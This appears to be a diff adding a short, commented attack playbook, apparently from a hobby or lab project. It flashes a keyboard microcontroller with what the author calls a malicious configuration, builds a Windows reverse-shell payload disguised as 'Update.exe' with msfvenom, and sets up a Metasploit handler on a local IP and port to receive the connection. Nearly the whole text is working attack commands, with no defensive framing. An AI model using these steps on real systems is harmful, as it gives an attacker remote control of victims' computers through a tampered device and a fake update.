@@ -1,0 +1,33 @@
+========== PART 1: FLASHING ==========
+
+// Erase existing configuration after keyboard is in DFU mode
+sudo dfu-programmer atmega32u4 erase
+
+// Flash the keyboard using my own malicious configuration
+sudo dfu-programmer atmega32u4 flash bucky_default.hex
+
+========== PART 2: REVERSE SHELL ==========
+
+// Creates an executable Update.exe. This will be set up beforehand.
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.58.128 LPORT=4444 -f exe -o Update.exe
+
+// Check the file (can skip this step)
+file Update.exe
+
+// Launches the msf console without showing text in the terminal
+msfconsole -q
+
+// Specify use of the exploit/multi/handler module
+use exploit/multi/handler
+
+// Configure module with settings as our executable so it knows what payload to expect
+set payload windows/shell/reverse_tcp
+
+// Set the network of the local host
+set LHOST 192.168.58.128
+
+// Set the port to listen
+set LPORT 4444
+
+// Commence the exploit
+exploit
